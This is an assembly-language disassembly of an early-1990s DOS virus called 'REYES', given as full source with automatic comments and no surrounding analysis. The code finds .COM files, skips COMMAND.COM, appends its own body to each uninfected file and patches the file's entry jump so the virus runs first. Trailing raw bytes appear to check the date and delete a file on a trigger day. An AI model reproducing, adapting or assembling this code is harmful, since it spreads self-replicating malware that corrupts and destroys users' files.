PAGE  60,132
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 REYES                        ;;
;;;                                      ;;
;;;      Created:   13-Jan-93                            ;;
;;;      Passes:    5          Analysis Flags on: H              ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
  
seg_a       segment
        assume  cs:seg_a, ds:seg_a
  
  
        org 100h
  
reyes       proc    far
  
start:
;*      jmp loc_10          ;*(0110)
        db  0E9h, 0Dh, 0
data_3      dw  21CDh
        dw  0FF20h
        db  0FFh, 0FFh, 0FFh, 6, 20h, 7
        db  20h, 8
data_6      db  20h
loc_10:
data_7      dw  4CE9h
        db  0, 0B8h, 0
        db  'L[-;=,./,'
        db  0, 0E9h, 0Dh, 0, 2Ah, 2Eh
        db  43h, 4Fh, 4Dh, 0, 1
        db  8 dup (3Fh)
        db  43h
data_9      dw  4D4Fh
        db  0, 5
        db  7 dup (0)
        db  20h, 0E0h, 0A8h, 90h, 1Bh, 5
        db  0, 0, 0
        db  'HELLO2.COM'
        db  0, 0, 0
        db  'COMMAND.COM'
        db  0, 0Eh
        db  'PPSQRVWU'
        db  1Eh, 89h, 0E5h, 0C7h, 46h, 10h
        db  0, 1, 0E8h, 0, 0, 58h
        db  2Dh, 63h, 0, 0B1h, 4, 0D3h
        db  0E8h, 8Ch, 0CBh, 1, 0D8h, 2Dh
        db  10h, 0, 50h, 0B8h, 78h, 1
        db  50h, 0CBh, 8Ch, 0C8h, 8Eh, 0D8h
        db  0E8h, 6, 0, 0E8h, 0D9h, 0
        db  0E9h, 5, 1, 6, 1Eh, 7
        db  0B4h, 1Ah, 0BAh, 18h, 1, 0CDh
        db  21h, 0B4h, 4Eh, 2Bh, 0C9h, 0BAh
        db  12h, 1, 0CDh
        db  21h, 72h, 9
loc_1:
        call    sub_1           ; (01C2)
        mov ah,4Fh          ; 'O'
        int 21h         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        jnc loc_1           ; Jump if carry=0
loc_2:
        pop ax
        push    ax
        push    ds
        mov ds,ax
        mov ah,1Ah
        mov dx,80h
        int 21h         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        pop ds
        pop es
        retn
  
reyes       endp
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_1       proc    near
        push    es
        mov ax,ds
        mov es,ax
        mov si,136h
        mov di,143h
        mov cx,0Ch
        cld             ; Clear direction
        repe    cmpsb           ; Rept zf=1+cx>0 Cmp [si] to es:[di]
        pop es
        jnz loc_3           ; Jump if not zero
        jmp loc_ret_8       ; (026A)
loc_3:
        mov ax,3D02h
        mov dx,136h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jnc loc_4           ; Jump if carry=0
        jmp loc_7           ; (0268)
loc_4:
        mov bx,ax
        push    data_3          ; (6EBC:0103=21CDh)
        push    word ptr ds:[105h]  ; (6EBC:0105=0FF20h)
        mov ah,3Fh          ; '?'
        mov cx,3
        mov dx,103h
        int 21h         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        jc  loc_6           ; Jump if carry Set
        mov al,data_6       ; (6EBC:010F=20h)
        cmp byte ptr data_3,al  ; (6EBC:0103=0CDh)
        jne loc_5           ; Jump if not equal
        mov ax,data_9       ; (6EBC:0132=4D4Fh)
        sub ax,1A1h
        sub ax,3
        cmp word ptr data_3+1,ax    ; (6EBC:0104=2021h)
        je  loc_6           ; Jump if equal
loc_5:
        mov ax,4202h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        jc  loc_6           ; Jump if carry Set
        or  ax,0Fh
        inc ax
        sub ax,3
        mov data_7,ax       ; (6EBC:0110=4CE9h)
        mov ax,4200h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        jc  loc_6           ; Jump if carry Set
        mov ah,40h          ; '@'
        mov cx,3
        mov dx,10Fh
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jc  loc_6           ; Jump if carry Set
        mov ax,4201h
        xor cx,cx           ; Zero register
        mov dx,data_7       ; (6EBC:0110=4CE9h)
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        jc  loc_6           ; Jump if carry Set
        mov ah,40h          ; '@'
        mov cx,1A1h
        mov dx,100h
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jc  loc_6           ; Jump if carry Set
        jmp loc_6           ; (025C)
loc_6:
        pop word ptr ds:[105h]  ; (6EBC:0105=0FF20h)
        pop data_3          ; (6EBC:0103=21CDh)
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
loc_7:
        jnc loc_ret_8       ; Jump if carry=0
  
loc_ret_8:
        retn
sub_1       endp
  
        db  6, 0B4h, 2Ah, 0CDh, 21h, 80h
        db  0FAh, 6, 75h, 23h, 80h, 0FEh
        db  1, 75h, 1Eh, 33h, 0C0h, 0B9h
        db  0FFh, 7Fh, 33h, 0FFh, 26h, 8Eh
        db  6, 2Ch, 0, 0FCh, 0F2h, 0AFh
        db  75h, 0Dh, 83h, 0C7h, 2, 1Eh
        db  6, 1Fh, 0B4h, 41h, 89h, 0FAh
        db  0CDh, 21h, 1Fh
loc_9:
        pop es
        retn
        db  0A1h, 3, 1, 26h, 0A3h, 0
        db  1, 0A0h, 5, 1, 26h, 0A2h
        db  2, 1, 1Fh, 5Dh, 5Fh, 5Eh
        db  5Ah, 59h, 5Bh, 58h, 0CBh
  
seg_a       ends
  
  
  
        end start
        